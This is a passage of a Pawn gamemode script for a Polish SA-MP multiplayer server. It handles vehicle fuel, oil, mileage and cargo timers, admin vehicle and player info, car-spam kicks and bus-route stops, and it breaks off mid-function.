		if(vehid != 0)
		{
			new engine, lights, alarm, doors, bonnet, boot, objective;

			if(GetVehicleParamsEx(vehid, engine, lights, alarm, doors, bonnet, boot, objective))
			{


				if(GetVehicleParamsEx(vehid, engine, lights, alarm, doors, bonnet, boot, objective))
				{



					if(engine == 0)
					{



					}

					if(engine == 1)
					{
						towarkmtimer[playerid] = SetTimerEx("KilometersTowar",300,true,"i",playerid);
					}

				}

			}

		}
		*/
		SetPVarInt(playerid,"company",PlayerInfo[playerid][Team]);

		/*if(IsPlayerInAnyVehicle(playerid))
		{
		new Float:vehhp;
		GetVehicleHealth(GetPlayerVehicleID(playerid), vehhp);
		if(vehhp + WYPADEK_CZULOSC < VehicleLastHP[GetPlayerVehicleID(playerid)] && PlayerInfo[playerid][Pasy] == false)
		{
			TogglePlayerControllable(playerid, false);
			SendClientMessage(playerid,Zielony,"# Spowodowales wypadek! Straciles przytomnosc! Dojdziesz do siebie za kilka sekund!");
			new Float:playerHP;
			GetPlayerHealth(playerid, playerHP);
			SetPlayerHealth(playerid, playerHP-random(60));
			SetTimerEx("wypadekoff",5*1000,false,"i",playerid);
		}
		else if(vehhp + WYPADEK_CZULOSC < VehicleLastHP[GetPlayerVehicleID(playerid)] && PlayerInfo[playerid][Pasy] == true)
		{
			SetTimerEx("wypadekoff",5*1000,false,"i",playerid);
			TogglePlayerControllable(playerid, false);
			SendClientMessage(playerid, Zielony, "# Spowodowales wypadek! Miales zapiete pasy, nic Ci sie nie stalo! ;-)");
		}


		VehicleLastHP[GetPlayerVehicleID(playerid)] = vehhp;
		}*/


		AntyWeapon(playerid);
		AntySpeedHack(playerid);
		//AntyVehLocation(playerid);
		return 1;
	}


	forward wypadekoff(playerid);
	public wypadekoff(playerid)
	{
		TogglePlayerControllable(playerid, true);
		//SendClientMessage(playerid, Zielony, "# Odzyskales przytomnosc! Na nastepny raz zapinaj pasy!");

		return 1;
	}

	/*public OnRconCommand(cmd[])
	{
		if(!strcmp(cmd,"!zapisz",false))
		{
			zapiszpojazdy();

			for(new i=0; i <= GetMaxPlayers(); i++)
			{
				if(IsPlayerConnected(i) && GetPVarInt(i,"zalogowany") == 1)
				{
					SaveUser(i);

				}
			}

			print("[console] Pojazdy i gracze zostali zapisani!");
		}


		if(cmd[0] == '@')
		{
			new string[200];
			format(string,sizeof string,"Konsola: %s",cmd[1]);
			SendClientMessageToAll(JasnyCzerwony,string);
			print(string);
		}


		return 1;
	}
*/

	public OnPlayerClickPlayer(playerid, clickedplayerid, source)
	{
		if(PlayerInfo[playerid][LevelAdmin] >= 1)
		{
			new string[150];
			format(string,sizeof string,"-------- %s ---------",PlayerName(clickedplayerid));
			SendClientMessage(playerid,Szary,string);
			new pIp[20];
			GetPlayerIp(clickedplayerid,pIp,sizeof pIp);
			format(string,sizeof string,"# IP: %s",pIp);
			SendClientMessage(playerid,Szary,string);
			format(string,sizeof string,"# Money: $%d",GetMoneyEx(clickedplayerid));
			SendClientMessage(playerid,Szary,string);
			format(string,sizeof string,"# Score: %d",GetScoreEx(clickedplayerid));
			SendClientMessage(playerid,Szary,string);
			format(string,sizeof string,"# Legalne: %d",PlayerInfo[clickedplayerid][Legalne]);
			SendClientMessage(playerid,Szary,string);
			format(string,sizeof string,"# Nielegalne: %d",PlayerInfo[clickedplayerid][Nielegalne]);
			SendClientMessage(playerid,Szary,string);
		}

		return 1;
	}


	public OnPlayerStateChange(playerid, newstate, oldstate)
	{

		if(newstate == PLAYER_STATE_DRIVER) // System Wypadkow
		{
			GetVehicleHealth(GetPlayerVehicleID(playerid),VehicleLastHP[GetPlayerVehicleID(playerid)]);
			PlayerVehLast[playerid] = GetPlayerVehicleID(playerid);
		} 


		if(newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER)
		{
			if(gSpectator[playerid] != INVALID_PLAYER_ID)
			{
				for(new i = 0; i < GetMaxPlayers(); i++)
				{
					if(IsPlayerConnected(i) && gSpectateID[i] == playerid && GetPlayerVehicleID(playerid) != 0)
					{
						gSpectateType[i] = ADMIN_SPEC_TYPE_VEHICLE;
						PlayerSpectateVehicle(i, GetPlayerVehicleID(playerid));
					}
				}
			}
		}


		if(newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER)
		{
			SetPVarInt(playerid,"teleportTimer",1);
			SetTimerEx("timerAntyCheatVeh",4000,false,"i",playerid);
		}


		if(newstate == PLAYER_STATE_ONFOOT)
		{
			if(gSpectator[playerid] != INVALID_PLAYER_ID)
			{
				for(new i = 0; i < GetMaxPlayers(); i++)
				{
					if(IsPlayerConnected(i) && gSpectateID[i] == playerid && GetPlayerVehicleID(playerid) == 0)
					{
						gSpectateType[i] = ADMIN_SPEC_TYPE_PLAYER;
						PlayerSpectatePlayer(i, playerid);
					}
				}
			}
		}

		if(newstate == PLAYER_STATE_DRIVER)
		{
			new vehicleid = GetPlayerVehicleID(playerid);
			if(strcmp(VehicleInfo[vehicleid][Owner],PlayerName(playerid),false) && strcmp(VehicleInfo[vehicleid][Owner],"Brak",false) && PlayerInfo[playerid][LevelAdmin] <= 4 && VehicleInfo[vehicleid][sell] == 0)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, Szary, "Nie posiadasz kluczykow do tego auta!");
			}
			if(VehicleInfo[vehicleid][sell] == 1)
			{
				TogglePlayerControllable(playerid,0);
				new string[100];
				format(string,sizeof string,"Te auto kosztuje: "BIALYHEX"$%d "ZIELONYHEX"aby je kupic wpisz "BIALYHEX"/car_buy",VehicleInfo[vehicleid][Price]);
				SendClientMessage(playerid, Niebieski, string);
				SendClientMessage(playerid, Zielony, "# Jezeli chcesz wyjsc z auta wpisz "BIALYHEX"/car_quit");
			}
			if(VehicleInfo[vehicleid][TeamCar] >= 1 && PlayerInfo[playerid][Team] != VehicleInfo[vehicleid][TeamCar] && PlayerInfo[playerid][LevelAdmin] <= 4)
			{
				new string[100];
				format(string,sizeof string,"To wlasnosc firmy/frakcji "BIALYHEX"%s "ZIELONYHEX"!",GetTeamName(VehicleInfo[vehicleid][TeamCar]));
				SendClientMessage(playerid, Szary,string);
				RemovePlayerFromVehicle(playerid);
			}



			new vehid = GetPlayerVehicleID(playerid);
			new modelt = GetVehicleTrailer(vehid);
			new dllt = GetVehicleIDTrailer(playerid,vehid,modelt);

			if(vehid != 0 && VehicleInfo[dllt][Towar] >= 1 && IsTrailerAttachedToVehicle(vehid))
			{
				new engine, lights, alarm, doors, bonnet, boot, objective;

				if(GetVehicleParamsEx(vehid, engine, lights, alarm, doors, bonnet, boot, objective))
				{

					if(engine == 1 && VehicleInfo[dllt][Towar] >= 1 && paused[playerid] == false)
					{

						new Float:predx, Float:predy, Float:predz,predb;
						GetVehicleVelocity(vehid,predx,predy,predz);
						predb = floatround(floatsqroot(floatpower(predx, 2) + floatpower(predy, 2) + floatpower(predz, 2)) * 169);

						if(VehicleInfo[dllt][KM] < MAX_ORDER_KM)
						{
							if(predb >= 1 && predb <= 10)
							{
								VehicleInfo[dllt][KM] += 0.0001;
							}
							if(predb >= 11 && predb <= 20)
							{
								VehicleInfo[dllt][KM] += 0.0008;
							}
							if(predb >= 21 && predb <= 30)
							{
								VehicleInfo[dllt][KM] += 0.0015;
							}
							if(predb >= 31 && predb <= 40)
							{
								VehicleInfo[dllt][KM] += 0.0020;
							}
							if(predb >= 41 && predb <= 50)
							{
								VehicleInfo[dllt][KM] += 0.0026;
							}
							if(predb >= 51 && predb <= 60)
							{
								VehicleInfo[dllt][KM] += 0.0030;
							}
							if(predb >= 61 && predb <= 70)
							{
								VehicleInfo[dllt][KM] += 0.0034;
							}
							if(predb >= 71 && predb <= 80)
							{
								VehicleInfo[dllt][KM] += 0.0039;
							}
							if(predb >= 81 && predb <= 90)
							{
								VehicleInfo[dllt][KM] += 0.0043;
							}
							if(predb >= 91 && predb <= 100)
							{
								VehicleInfo[dllt][KM] += 0.0048;
							}
							if(predb >= 101 && predb <= 110)
							{
								VehicleInfo[dllt][KM] += 0.0064;
							}
							if(predb >= 111 && predb <= 120)
							{
								VehicleInfo[dllt][KM] += 0.0078;
							}
							if(predb >= 121 && predb <= 130)
							{
								VehicleInfo[dllt][KM] += 0.0087;
							}
							if(predb >= 131 && predb <= 140)
							{
								VehicleInfo[dllt][KM] += 0.0094;
							}
							if(predb >= 141 && predb <= 150)
							{
								VehicleInfo[dllt][KM] += 0.0100;
							}
							if(predb >= 151 && predb <= 160)
							{
								VehicleInfo[dllt][KM] += 0.0109;
							}
							if(predb >= 161)
							{
								VehicleInfo[dllt][KM] += 0.0115;
							}
						}

						new query[150];
						new towar = VehicleInfo[dllt][Towar];
						format(query,sizeof query,"~r~%s: ~n~~w~%0.2f km",cInfo[towar][namet],VehicleInfo[dllt][KM]);
						TextDrawSetString(towartd[playerid],query);
						TextDrawShowForPlayer(playerid,towartd[playerid]);
					}


				}
			}
			else
				TextDrawHideForPlayer(playerid,towartd[playerid]);



		}

		if(newstate == PLAYER_STATE_DRIVER)
		{
			SendClientMessage(playerid,Zielony,"# Aby wywolac menu pojazdu wpisz /on lub nacisnij klawisz "BIALYHEX"Y"ZIELONYHEX" na klawiaturze!");
		}

		if(newstate == PLAYER_STATE_DRIVER)
		{
			new vehid = GetPlayerVehicleID(playerid);


			if(vehid != 0)
			{
				new engine, lights, alarm, doors, bonnet, boot, objective;

				if(GetVehicleParamsEx(vehid, engine, lights, alarm, doors, bonnet, boot, objective))
				{
					if(engine == 1)
					{
						TextDrawSetString(silniktd[playerid],"~r~Silnik:~w~ ON");
					}
					else
					{
						TextDrawSetString(silniktd[playerid],"~r~Silnik:~w~ OFF");
					}
				}
			}
		}


		if(newstate == PLAYER_STATE_DRIVER)
		{
			if(PlayerInfo[playerid][LevelAdmin] >= 1)
			{
				new query[300];
				format(query,sizeof query," [ID DLL] "BIALYHEX"%d "INFOHEX"[UID] "BIALYHEX"%d "INFOHEX"[Cena Rynkowa] "BIALYHEX"%d "INFOHEX"[Sell] "BIALYHEX"%d "INFOHEX"[Owner] "BIALYHEX"%s",GetPlayerVehicleID(playerid),VehicleInfo[GetPlayerVehicleID(playerid)][UID],VehicleInfo[GetPlayerVehicleID(playerid)][Rynkowa],VehicleInfo[GetPlayerVehicleID(playerid)][sell],VehicleInfo[GetPlayerVehicleID(playerid)][Owner]);
				SendClientMessage(playerid,COLOR_INFOS,query);
				format(query,sizeof query," [Team] "BIALYHEX"%d "INFOHEX"[Cena] "BIALYHEX"$%d ",VehicleInfo[GetPlayerVehicleID(playerid)][TeamCar],VehicleInfo[GetPlayerVehicleID(playerid)][Price]);
				SendClientMessage(playerid,COLOR_INFOS,query);
			}
		}

		if(newstate == PLAYER_STATE_DRIVER)
		{
			TextDrawShowForPlayer(playerid,useboxp);
			TextDrawShowForPlayer(playerid,useboxp2);
			//TextDrawShowForPlayer()
			TextDrawShowForPlayer(playerid,predkosc[playerid]);
			TextDrawShowForPlayer(playerid,paliwotd[playerid]);
			TextDrawShowForPlayer(playerid,przebiegtd[playerid]);
			TextDrawShowForPlayer(playerid,towartd[playerid]);
			TextDrawShowForPlayer(playerid,olejtd[playerid]);
			TextDrawShowForPlayer(playerid,namevehtd[playerid]);
			TextDrawShowForPlayer(playerid,silniktd[playerid]);

			timerolej[playerid] = SetTimerEx("olej",15*60000,true,"i",playerid);
			timerolej2[playerid] = SetTimerEx("olej2",3*1000,true,"i",playerid);
			timerpojazd[playerid] = SetTimerEx("Pojazd",80,true,"i",playerid);
			timerpaliwo[playerid] = SetTimerEx("PaliwoT",30000,true,"i",playerid);
			timerprzebieg[playerid] = SetTimerEx("PrzebiegT",300,true,"i",playerid);
		}
		else
		{
			TextDrawHideForPlayer(playerid,predkosc[playerid]);
			TextDrawHideForPlayer(playerid,paliwotd[playerid]);
			TextDrawHideForPlayer(playerid,przebiegtd[playerid]);
			TextDrawHideForPlayer(playerid,useboxp);
			TextDrawHideForPlayer(playerid,useboxp2);
			TextDrawHideForPlayer(playerid,towartd[playerid]);
			TextDrawHideForPlayer(playerid,silniktd[playerid]);
			TextDrawHideForPlayer(playerid,namevehtd[playerid]);
			TextDrawHideForPlayer(playerid,olejtd[playerid]);
			KillTimer(timerolej[playerid]);
			KillTimer(timerpojazd[playerid]);
			KillTimer(timerolej2[playerid]);
			KillTimer(timerpaliwo[playerid]);
			KillTimer(timerprzebieg[playerid]);
		}


		// ANTY SPAM CAR

		if(newstate == PLAYER_STATE_DRIVER)
		{
			if((GetTickCount()-GetPVarInt(playerid, "cartime")) < 1000) // enters veh as driver faster than 1 once
			{
				SetPVarInt(playerid, "carspam", GetPVarInt(playerid, "carspam")+1);
				if(GetPVarInt(playerid, "carspam") >= 5) // allows 5 seconds leeway to compensate for glitching, then kicks
				{
					printf("[ANTY] %s - anty car spam kicked!",PlayerName(playerid));
					return KickExServer(playerid,"Car Spam"); //KickExServer(playerid,"Anty Spam Car");
				}
			}
			SetPVarInt(playerid, "cartime", GetTickCount());
		}



		return 1;
	}
	public OnVehicleDeath(vehicleid, killerid)
	{
		VehicleInfo[vehicleid][Olej]--;
		return 1;
	}

	forward olej2(playerid);
	public olej2(playerid)
	{
		new vehid = GetPlayerVehicleID(playerid);


		if(vehid != 0)
		{
			new engine, lights, alarm, doors, bonnet, boot, objective;

			if(GetVehicleParamsEx(vehid, engine, lights, alarm, doors, bonnet, boot, objective))
			{
				if(engine == 1)
				{
					if(VehicleInfo[vehid][Olej] == 4 && random(80) == random(80)) SetVehicleParamsEx(vehid, 0, lights, alarm, doors, bonnet, boot, objective);
					if(VehicleInfo[vehid][Olej] == 3 && random(50) == random(50)) SetVehicleParamsEx(vehid, 0, lights, alarm, doors, bonnet, boot, objective);
					if(VehicleInfo[vehid][Olej] == 2 && random(20) == random(20)) SetVehicleParamsEx(vehid, 0, lights, alarm, doors, bonnet, boot, objective);
					if(VehicleInfo[vehid][Olej] == 1 && random(10) == random(10)) SetVehicleParamsEx(vehid, 0, lights, alarm, doors, bonnet, boot, objective);
					if(VehicleInfo[vehid][Olej] == 0 && random(4) == random(4)) SetVehicleParamsEx(vehid, 0, lights, alarm, doors, bonnet, boot, objective);
				}
			}
		}
		return 1;
	}

	forward olej(playerid);
	public olej(playerid)
	{
		new vehid = GetPlayerVehicleID(playerid);


		if(vehid != 0)
		{
			new engine, lights, alarm, doors, bonnet, boot, objective;

			if(GetVehicleParamsEx(vehid, engine, lights, alarm, doors, bonnet, boot, objective))
			{
				if(engine == 1)
				{
					VehicleInfo[vehid][Olej]--;

					if(VehicleInfo[vehid][Olej] <= 0) VehicleInfo[vehid][Olej] = 0;
				}
			}
		}
		return 1;
	}

	forward Pojazd(playerid);
	public Pojazd(playerid)
	{
		new vehid = GetPlayerVehicleID(playerid);
		if(vehid != 0)
		{
			new Float:predx, Float:predy, Float:predz,predb;
			GetVehicleVelocity(vehid,predx,predy,predz);
			predb = floatround(floatsqroot(floatpower(predx, 2) + floatpower(predy, 2) + floatpower(predz, 2)) * 169);

			new query[100];
			format(query,sizeof query,"~r~Predkosc: ~w~%d km/h",predb);
			TextDrawSetString(predkosc[playerid],query);

			format(query,sizeof query,"%s",VehName[GetVehicleModel(vehid)-400]);
			TextDrawSetString(namevehtd[playerid],query);

			if(VehicleInfo[vehid][Olej] == 10) format(query,sizeof query,"~r~Olej: ~w~ l l l l l l l l l l");
			if(VehicleInfo[vehid][Olej] == 9) format(query,sizeof query,"~r~Olej: ~w~ l l l l l l l l l");
			if(VehicleInfo[vehid][Olej] == 8) format(query,sizeof query,"~r~Olej: ~w~ l l l l l l l l");
			if(VehicleInfo[vehid][Olej] == 7) format(query,sizeof query,"~r~Olej: ~w~ l l l l l l l");
			if(VehicleInfo[vehid][Olej] == 6) format(query,sizeof query,"~r~Olej: ~w~ l l l l l l");
			if(VehicleInfo[vehid][Olej] == 5) format(query,sizeof query,"~r~Olej: ~w~ l l l l l");
			if(VehicleInfo[vehid][Olej] == 4) format(query,sizeof query,"~r~Olej: ~w~ l l l l");
			if(VehicleInfo[vehid][Olej] == 3) format(query,sizeof query,"~r~Olej: ~w~ l l l");
			if(VehicleInfo[vehid][Olej] == 2) format(query,sizeof query,"~r~Olej: ~w~ l l");
			if(VehicleInfo[vehid][Olej] == 1) format(query,sizeof query,"~r~Olej: ~w~ l");
			if(VehicleInfo[vehid][Olej] == 0) format(query,sizeof query,"~r~Olej: ~w~ Brak");

			TextDrawSetString(olejtd[playerid],query);




		}


		return 1;
	}

	forward KilometersTowar(playerid);
	public KilometersTowar(playerid)
	{
		new vehid = GetPlayerVehicleID(playerid);
		new modelt = GetVehicleTrailer(vehid);
		new dllt = GetVehicleIDTrailer(playerid,vehid,modelt);

		new randMagazine = VehicleInfo[dllt][ToOrder];


		if(VehicleInfo[dllt][Towar] >= 1 && vehid != 0)
		{
			SetPlayerMapIcon(playerid,69,MagazineInfo[randMagazine][x],MagazineInfo[randMagazine][y],MagazineInfo[randMagazine][z],53 , 0, MAPICON_GLOBAL);
		}
		else
			RemovePlayerMapIcon(playerid,69);



		if(vehid != 0 && VehicleInfo[dllt][Towar] >= 1 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER && PlayerInfo[playerid][Team] != 1 && PlayerInfo[playerid][Team] != 2 && PlayerInfo[playerid][Team] != 3 && PlayerInfo[playerid][Team] != 10)
		{

			if(GetVehicleModel(vehid) == 403 || GetVehicleModel(vehid) == 482 || IsTrailerAttachedToVehicle(vehid))
			{
				new engine, lights, alarm, doors, bonnet, boot, objective;

				if(GetVehicleParamsEx(vehid, engine, lights, alarm, doors, bonnet, boot, objective))
				{

					if(engine == 1 && VehicleInfo[dllt][Towar] >= 1 && paused[playerid] == false)
					{

						new Float:predx, Float:predy, Float:predz,predb;
						GetVehicleVelocity(vehid,predx,predy,predz);
						predb = floatround(floatsqroot(floatpower(predx, 2) + floatpower(predy, 2) + floatpower(predz, 2)) * 169);

						if(VehicleInfo[dllt][KM] < MAX_ORDER_KM)
						{
							if(predb >= 1 && predb <= 10)
							{
								VehicleInfo[dllt][KM] += 0.0001;
							}
							if(predb >= 11 && predb <= 20)
							{
								VehicleInfo[dllt][KM] += 0.0008;
							}
							if(predb >= 21 && predb <= 30)
							{
								VehicleInfo[dllt][KM] += 0.0015;
							}
							if(predb >= 31 && predb <= 40)
							{
								VehicleInfo[dllt][KM] += 0.0020;
							}
							if(predb >= 41 && predb <= 50)
							{
								VehicleInfo[dllt][KM] += 0.0026;
							}
							if(predb >= 51 && predb <= 60)
							{
								VehicleInfo[dllt][KM] += 0.0030;
							}
							if(predb >= 61 && predb <= 70)
							{
								VehicleInfo[dllt][KM] += 0.0034;
							}
							if(predb >= 71 && predb <= 80)
							{
								VehicleInfo[dllt][KM] += 0.0039;
							}
							if(predb >= 81 && predb <= 90)
							{
								VehicleInfo[dllt][KM] += 0.0043;
							}
							if(predb >= 91 && predb <= 100)
							{
								VehicleInfo[dllt][KM] += 0.0048;
							}
							if(predb >= 101 && predb <= 110)
							{
								VehicleInfo[dllt][KM] += 0.0064;
							}
							if(predb >= 111 && predb <= 120)
							{
								VehicleInfo[dllt][KM] += 0.0078;
							}
							if(predb >= 121 && predb <= 130)
							{
								VehicleInfo[dllt][KM] += 0.0087;
							}
							if(predb >= 131 && predb <= 140)
							{
								VehicleInfo[dllt][KM] += 0.0094;
							}
							if(predb >= 141 && predb <= 150)
							{
								VehicleInfo[dllt][KM] += 0.0100;
							}
							if(predb >= 151 && predb <= 160)
							{
								VehicleInfo[dllt][KM] += 0.0109;
							}
							if(predb >= 161)
							{
								VehicleInfo[dllt][KM] += 0.0115;
							}
						}

						new query[150];
						new towar = VehicleInfo[dllt][Towar];
						format(query,sizeof query,"~r~%s: ~n~~w~%0.2f km",cInfo[towar][namet],VehicleInfo[dllt][KM]);
						TextDrawSetString(towartd[playerid],query);
						TextDrawShowForPlayer(playerid,towartd[playerid]);
					}
				}
			}
		}
		else
			TextDrawHideForPlayer(playerid,towartd[playerid]);
		return 1;
	}


	forward PrzebiegT(playerid);
	public PrzebiegT(playerid)
	{
		new vehid = GetPlayerVehicleID(playerid);
		if(vehid != 0 && paused[playerid] == false)
		{

			new Float:predx, Float:predy, Float:predz,predb;
			GetVehicleVelocity(vehid,predx,predy,predz);
			predb = floatround(floatsqroot(floatpower(predx, 2) + floatpower(predy, 2) + floatpower(predz, 2)) * 169);

			new query[100];

			new engine, lights, alarm, doors, bonnet, boot, objective;

			if(GetVehicleParamsEx(vehid, engine, lights, alarm, doors, bonnet, boot, objective))
			{

				if(engine == 1)
				{
					if(predb >= 1 && predb <= 10)
					{
						VehicleInfo[vehid][Przebieg] += 0.0001;
					}
					if(predb >= 11 && predb <= 20)
					{
						VehicleInfo[vehid][Przebieg] += 0.0008;
					}
					if(predb >= 21 && predb <= 30)
					{
						VehicleInfo[vehid][Przebieg] += 0.0015;
					}
					if(predb >= 31 && predb <= 40)
					{
						VehicleInfo[vehid][Przebieg] += 0.0020;
					}
					if(predb >= 41 && predb <= 50)
					{
						VehicleInfo[vehid][Przebieg] += 0.0026;
					}
					if(predb >= 51 && predb <= 60)
					{
						VehicleInfo[vehid][Przebieg] += 0.0030;
					}
					if(predb >= 61 && predb <= 70)
					{
						VehicleInfo[vehid][Przebieg] += 0.0034;
					}
					if(predb >= 71 && predb <= 80)
					{
						VehicleInfo[vehid][Przebieg] += 0.0039;
					}
					if(predb >= 81 && predb <= 90)
					{
						VehicleInfo[vehid][Przebieg] += 0.0043;
					}
					if(predb >= 91 && predb <= 100)
					{
						VehicleInfo[vehid][Przebieg] += 0.0048;
					}
					if(predb >= 101 && predb <= 110)
					{
						VehicleInfo[vehid][Przebieg] += 0.0064;
					}
					if(predb >= 111 && predb <= 120)
					{
						VehicleInfo[vehid][Przebieg] += 0.0078;
					}
					if(predb >= 121 && predb <= 130)
					{
						VehicleInfo[vehid][Przebieg] += 0.0087;
					}
					if(predb >= 131 && predb <= 140)
					{
						VehicleInfo[vehid][Przebieg] += 0.0094;
					}
					if(predb >= 141 && predb <= 150)
					{
						VehicleInfo[vehid][Przebieg] += 0.0100;
					}
					if(predb >= 151 && predb <= 160)
					{
						VehicleInfo[vehid][Przebieg] += 0.0109;
					}
					if(predb >= 161)
					{
						VehicleInfo[vehid][Przebieg] += 0.0115;
					}

					format(query,sizeof query,"~r~Przebieg: ~w~%0.2f km",VehicleInfo[vehid][Przebieg]);
					TextDrawSetString(przebiegtd[playerid],query);



				}
			}
		}

		return 1;
	}


	public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
	{
		if(PlayerInfo[playerid][LevelAdmin] >= 1)
		{
			SetPlayerPosFindZ(playerid, fX, fY, fZ);
		}

		return 1;
	}


	forward PaliwoT(playerid);
	public PaliwoT(playerid)
	{
		new vehid = GetPlayerVehicleID(playerid);
		if(vehid != 0)
		{
			new engine, lights, alarm, doors, bonnet, boot, objective;

			if(GetVehicleParamsEx(vehid, engine, lights, alarm, doors, bonnet, boot, objective))
			{

				if(engine == 1)
				{
					VehicleInfo[vehid][Paliwo]--;
				}
			}

			new query[150];

			new paliwstatus[50];

			if(VehicleInfo[vehid][Paliwo] >= 300)
			{
				format(paliwstatus,sizeof paliwstatus,"~w~%d",VehicleInfo[vehid][Paliwo]);
			}

			if(VehicleInfo[vehid][Paliwo] >= 250 && VehicleInfo[vehid][Paliwo] <= 299)
			{
				format(paliwstatus,sizeof paliwstatus,"~w~%d",VehicleInfo[vehid][Paliwo]);
			}

			if(VehicleInfo[vehid][Paliwo] >= 200 && VehicleInfo[vehid][Paliwo] <= 249)
			{
				format(paliwstatus,sizeof paliwstatus,"~w~%d",VehicleInfo[vehid][Paliwo]);
			}

			if(VehicleInfo[vehid][Paliwo] >= 150 && VehicleInfo[vehid][Paliwo] <= 199)
			{
				format(paliwstatus,sizeof paliwstatus,"~w~%d",VehicleInfo[vehid][Paliwo]);
			}

			if(VehicleInfo[vehid][Paliwo] >= 100 && VehicleInfo[vehid][Paliwo] <= 149)
			{
				format(paliwstatus,sizeof paliwstatus,"~w~%d",VehicleInfo[vehid][Paliwo]);
			}

			if(VehicleInfo[vehid][Paliwo] >= 1 && VehicleInfo[vehid][Paliwo] <= 99)
			{
				format(paliwstatus,sizeof paliwstatus,"~r~%d ~y~[R]",VehicleInfo[vehid][Paliwo]);
			}

			if(VehicleInfo[vehid][Paliwo] <= 30) SprawdzOsiagniecie(playerid,6);

			if(VehicleInfo[vehid][Paliwo] <= 0)
			{
				format(paliwstatus,sizeof paliwstatus,"~r~Puste");
				GameTextForPlayer(playerid, "Koniec paliwa!",8000,5);
				SetVehicleParamsEx(vehid, 0,0,0,0,0,0,0);
			}
			format(query,sizeof query,"~r~Paliwo: ~w~%s L",paliwstatus);
			TextDrawSetString(paliwotd[playerid],query);



		}
		return 1;
	}

	public OnPlayerEnterVehicle(playerid,vehicleid)
	{

		new vehid = vehicleid;
		new query[150];

		new paliwstatus[50];

		if(VehicleInfo[vehid][Paliwo] >= 300)
		{
			format(paliwstatus,sizeof paliwstatus,"%d",VehicleInfo[vehid][Paliwo]);
		}

		if(VehicleInfo[vehid][Paliwo] >= 250 && VehicleInfo[vehid][Paliwo] <= 299)
		{
			format(paliwstatus,sizeof paliwstatus,"%d",VehicleInfo[vehid][Paliwo]);
		}

		if(VehicleInfo[vehid][Paliwo] >= 200 && VehicleInfo[vehid][Paliwo] <= 249)
		{
			format(paliwstatus,sizeof paliwstatus,"%d",VehicleInfo[vehid][Paliwo]);
		}

		if(VehicleInfo[vehid][Paliwo] >= 150 && VehicleInfo[vehid][Paliwo] <= 199)
		{
			format(paliwstatus,sizeof paliwstatus,"%d",VehicleInfo[vehid][Paliwo]);
		}

		if(VehicleInfo[vehid][Paliwo] >= 51 && VehicleInfo[vehid][Paliwo] <= 149)
		{
			format(paliwstatus,sizeof paliwstatus,"%d",VehicleInfo[vehid][Paliwo]);
		}

		if(VehicleInfo[vehid][Paliwo] >= 1 && VehicleInfo[vehid][Paliwo] <= 50)
		{
			format(paliwstatus,sizeof paliwstatus,"~r~%d ~w~[R]",VehicleInfo[vehid][Paliwo]);
		}

		if(VehicleInfo[vehid][Paliwo] <= 0)
		{
			format(paliwstatus,sizeof paliwstatus,"~r~Puste");
			GameTextForPlayer(playerid, "Koniec paliwa!",8000,5);
			SetVehicleParamsEx(vehid, 0,0,0,0,0,0,0);
		}
		format(query,sizeof query,"~r~Paliwo: ~w~%s",paliwstatus);
		TextDrawSetString(paliwotd[playerid],query);

		format(query,sizeof query,"~r~Przebieg: ~w~%0.2f km",VehicleInfo[vehid][Przebieg]);
		TextDrawSetString(przebiegtd[playerid],query);

		new modelt = GetVehicleTrailer(vehid);
		new dllt = GetVehicleIDTrailer(playerid,vehid,modelt);

		new towar = VehicleInfo[dllt][Towar];
		if(towar >= 1 && GetVehicleTrailer(vehid))
		{
			format(query,sizeof query,"~r~%s: ~r~%0.2f km",cInfo[towar][namet],VehicleInfo[dllt][KM]);
			TextDrawSetString(towartd[playerid],query);

		}
		else
		{
			TextDrawSetString(towartd[playerid],"");
		}

		new engine, lights, alarm, doors, bonnet, boot, objective;

		if(GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective))
		{
			if(PlayerInfo[playerid][Team] == 1)
			{
			SetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, 0, bonnet, boot, objective);
			}
		}


		return 1;
	}

	public OnPlayerExitVehicle(playerid, vehicleid)
	{
		new engine, lights, alarm, doors, bonnet, boot, objective;

		if(GetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective))
		{
			if(GetPlayerVehicleID(playerid) != 0)
			{
				SetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, 0, bonnet, boot, objective);
			}
		}
		return 1;
	}

	public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
	{
		new vehid = GetPlayerVehicleID(playerid);


		if(newkeys & 131072) // KEY >> NO >> N
		{
			if(GetVehicleModel(vehid) == 431 || GetVehicleModel(vehid) == 437)
			{

				new linid = GetPVarInt(playerid,"playerKurs");
				new przyst = GetPVarInt(playerid,"playerPrzystanek");

				if(linid >= 0) // Copyright (c) 2014-2015 KapiziaK
				{
					new Float:predx, Float:predy, Float:predz,predb;
					GetVehicleVelocity(vehid,predx,predy,predz);
					predb = floatround(floatsqroot(floatpower(predx, 2) + floatpower(predy, 2) + floatpower(predz, 2)) * 169);


					if(predb <= 15)
					{

						STOP_VEH(playerid);
						if(przyst == 0)
						{


							new kID = KursInfo[linid][kurs1];

							if(IsPlayerInRangeOfPoint(playerid, 8.0, LiniaInfo[kID][linx],LiniaInfo[kID][liny],LiniaInfo[kID][linz]))
							{
								kID = KursInfo[linid][kurs2];

								SetPVarInt(playerid,"playerPrzystanek",1);
								SetPlayerMapIcon(playerid,70,LiniaInfo[kID][linx],LiniaInfo[kID][liny],LiniaInfo[kID][linz],53 , 0, MAPICON_GLOBAL);

								new string[150];
								SendClientMessage(playerid, Zielony, "# Przystanek zaliczony!");
								new biletnum = random(10);
								PlayerInfo[playerid][Bilety] += biletnum;
								format(string,sizeof string,"# Otrzymales: %d biletow!",biletnum);
								SendClientMessage(playerid, Zielony, string);
								//SendClientMessage(playerid, Zielony, "Otrzymales: "BIALYHEX"5 biletow!");
								format(string,sizeof string,"# Kurs na przystanek: "BIALYHEX"%s",LiniaInfo[kID][linname]);
								SendClientMessage(playerid, Zielony, string);


							}
						}


						if(przyst == 1)
						{


							new kID = KursInfo[linid][kurs2];

							if(IsPlayerInRangeOfPoint(playerid, 8.0, LiniaInfo[kID][linx],LiniaInfo[kID][liny],LiniaInfo[kID][linz]))
							{
								kID = KursInfo[linid][kurs3];

